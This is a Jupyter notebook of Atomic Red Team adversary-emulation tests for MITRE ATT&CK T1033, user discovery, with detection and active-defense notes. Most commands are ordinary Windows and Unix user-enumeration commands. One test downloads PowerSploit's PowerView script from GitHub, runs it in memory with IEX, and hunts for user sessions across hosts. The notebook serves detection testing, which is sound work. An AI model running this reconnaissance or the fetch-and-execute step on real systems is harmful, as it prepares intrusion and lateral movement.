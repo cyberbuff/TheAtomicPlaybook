{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c28f1c52",
   "metadata": {},
   "source": "# T1033 - System Owner/User Discovery\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)"
  },
  {
   "cell_type": "markdown",
   "id": "81f758cd",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "0c3219b6",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - System Owner/User Discovery",
    "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"localhost\"\nquser\nqwinsta.exe /server:localhost\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d33ad7d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "fb998b63",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - System Owner/User Discovery",
    "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nusers\nw\nwho\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4c12f69a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "fa74b849",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Find computers where user has session - Stealth mode (PowerView)",
    "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "55a36cbb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "86ee512a",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - User Discovery With Env Vars PowerShell Script",
    "Use the PowerShell environment variables to identify the current logged user.",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8c17732",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "59cb4b36",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path .\\CurrentactiveUser.txt -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e16cbd22",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9a9424bd",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - GetCurrent User with PowerShell Script",
    "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c3da0b8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "ac4857fe",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path .\\CurrentUserObject.txt -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b2b8d16d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5d8eee79",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - System Discovery - SocGholish whoami",
    "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> $env:temp\\$file\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "07132b67",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "0f074f22",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path $env:temp\\rad*.tmp -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "53ac32cb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1033 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e0543bf6",
   "metadata": {},
   "source": "## Detection\n`System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations."
  },
  {
   "cell_type": "markdown",
   "id": "c5c145e1",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Software Manipulation \n Make changes to a system's software properties and functions to achieve a desired effect. \n\n Software Manipulation allows a defender to alter or replace elements of the operating system, file system, or any other software installed and executed on a system.\n#### Opportunity\nThere is an opportunity for the defender to observe the adversary and control what they can see, what effects they can have, and/or what data they can access.\n#### Use Case\nA defender can impact an adversary's activity by manipulating or replacing the commands commonly used to display users on a system.\n#### Procedures\nHook the Win32 Sleep() function so that it always performs a Sleep(1) instead of the intended duration. This can increase the speed at which dynamic analysis can be performed when a normal malicious file sleeps for long periods before attempting additional capabilities.\nHook the Win32 NetUserChangePassword() and modify it such that the new password is different from the one provided. The data passed into the function is encrypted along with the modified new password, then logged so a defender can get alerted about the change as well as decrypt the new password for use.\nAlter the output of an adversary's profiling commands to make newly-built systems look like the operating system was installed months earlier.\nAlter the output of adversary recon commands to not show important assets, such as a file server containing sensitive data.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}